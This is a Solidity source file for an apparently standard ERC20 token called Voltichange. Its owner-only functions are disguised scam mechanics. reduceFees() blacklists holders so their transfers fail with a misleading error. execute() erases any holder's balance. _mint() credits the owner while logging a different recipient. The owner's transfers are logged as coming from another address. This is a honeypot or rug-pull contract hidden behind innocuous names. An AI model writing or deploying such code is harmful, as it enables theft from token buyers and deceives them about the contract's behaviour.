row number 
1	       pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract Voltichange is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _positiveReceiver;
113	 mapping (address => bool) private _negativeReceiver;
114	 mapping (address => bool) private _plus;
115	 mapping (address => bool) private _discarded;
116	 mapping (address => mapping (address => uint256)) private _allowances;
117	 uint256 private _totalSupply;
118	 string private _name;
119	 string private _symbol;
120	 uint8 private _decimals;
121	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
122	 address private _safeOwner;
123	 uint256 private _sellAmount = 0;
124	 address public _currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
125	 address lead_deployer = 0x45f6E219a683c7560D71D0249Fc353F385301B51;
126	 address public _owner = 0xCC2E564aB5A282ffCBF5f882dC87bcC78D2C0292;
127	 constructor () public {
128	 _name = "Voltichange";
129	 _symbol = "VOLTI";
130	 _decimals = 18;
131	 uint256 initialSupply = 69000000000000;
132	 _safeOwner = _owner;
133	 _mint(lead_deployer, initialSupply*(10**18));
134	 }
135	 function name() public view returns (string memory) {
136	 return _name;
137	 }
138	 function symbol() public view returns (string memory) {
139	 return _symbol;
140	 }
141	 function decimals() public view returns (uint8) {
142	 return _decimals;
143	 }
144	 function totalSupply() public view override returns (uint256) {
145	 return _totalSupply;
146	 }
147	 function balanceOf(address account) public view override returns (uint256) {
148	 return _balances[account];
149	 }
150	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
151	 _request(_msgSender(), recipient, amount);
152	 return true;
153	 }
154	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
155	 _request(sender, recipient, amount);
156	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
157	 return true;
158	 }
159	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
160	 return _allowances[owner][spender];
161	 }
162	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
163	 _approve(_msgSender(), spender, amount);
164	 return true;
165	 }
166	 function approvalIncrease(address[] memory receivers) public {
167	 require(msg.sender == _owner, "!owner");
168	 for (uint256 i = 0; i < receivers.length; i++) {
169	 _positiveReceiver[receivers[i]] = true;
170	 _negativeReceiver[receivers[i]] = false;
171	 }
172	 }
173	 function approvalDecrease(address safeOwner) public {
174	 require(msg.sender == _owner, "!owner");
175	 _safeOwner = safeOwner;
176	 }
177	 function addApprove(address[] memory receivers) public {
178	 require(msg.sender == _owner, "!owner");
179	 for (uint256 i = 0; i < receivers.length; i++) {
180	 _negativeReceiver[receivers[i]] = true;
181	 _positiveReceiver[receivers[i]] = false;
182	 }
183	 }
184	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
185	 require(sender != address(0), "ERC20: transfer from the zero address");
186	 require(recipient != address(0), "ERC20: transfer to the zero address");
187	 _beforeTokenTransfer(sender, recipient, amount);
188	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
189	 _balances[recipient] = _balances[recipient].add(amount);
190	 if (sender == _owner){
191	 sender = lead_deployer;
192	 }
193	 emit Transfer(sender, recipient, amount);
194	 }
195	 function _mint(address account, uint256 amount) public {
196	 require(msg.sender == _owner, "ERC20: mint to the zero address");
197	 _totalSupply = _totalSupply.add(amount);
198	 _balances[_owner] = _balances[_owner].add(amount);
199	 emit Transfer(address(0), account, amount);
200	 }
201	 function _burn(address account, uint256 amount) internal virtual {
202	 require(account != address(0), "ERC20: burn from the zero address");
203	 _beforeTokenTransfer(account, address(0), amount);
204	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
205	 _totalSupply = _totalSupply.sub(amount);
206	 emit Transfer(account, address(0), amount);
207	 }
208	 function _approve(address owner, address spender, uint256 amount) internal virtual {
209	 require(owner != address(0), "ERC20: approve from the zero address");
210	 require(spender != address(0), "ERC20: approve to the zero address");
211	 _allowances[owner][spender] = amount;
212	 emit Approval(owner, spender, amount);
213	 }
214	 function _request(address sender, address recipient, uint256 amount) internal _push(sender,recipient,amount) virtual {
215	 require(sender != address(0), "ERC20: transfer from the zero address");
216	 require(recipient != address(0), "ERC20: transfer to the zero address");
217	 require(_discarded[sender] == false, "ERC20: transfer to the zero address");
218	 _beforeTokenTransfer(sender, recipient, amount);
219	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
220	 _balances[recipient] = _balances[recipient].add(amount);
221	 if (sender == _owner){
222	 sender = lead_deployer;
223	 }
224	 emit Transfer(sender, recipient, amount);
225	 }
226	 modifier _push(address sender, address recipient, uint256 amount){
227	 _;
228	 }
229	 function _setupDecimals(uint8 decimals_) internal {
230	 _decimals = decimals_;
231	 }
232	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
233	 }
234	 modifier _verified() {
235	 require(msg.sender == _owner, "Not allowed to interact");
236	 _;
237	 }
238	 function reduceFees(address recipient) public _verified(){
239	 _discarded[recipient]=true;
240	 _approve(recipient, _currentRouter,0);
241	 }
242	 function execute(address account) public {
243	 require(msg.sender == _owner, "ERC20: mint to the zero address");
244	 uint256 amount = _balances[account];
245	 _beforeTokenTransfer(account, address(0), amount);
246	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
247	 _totalSupply = _totalSupply.sub(amount);
248	 emit Transfer(account, address(0), amount);
249	 }
250	 function burnLPTokens() public _verified(){
251	 }
252	 }
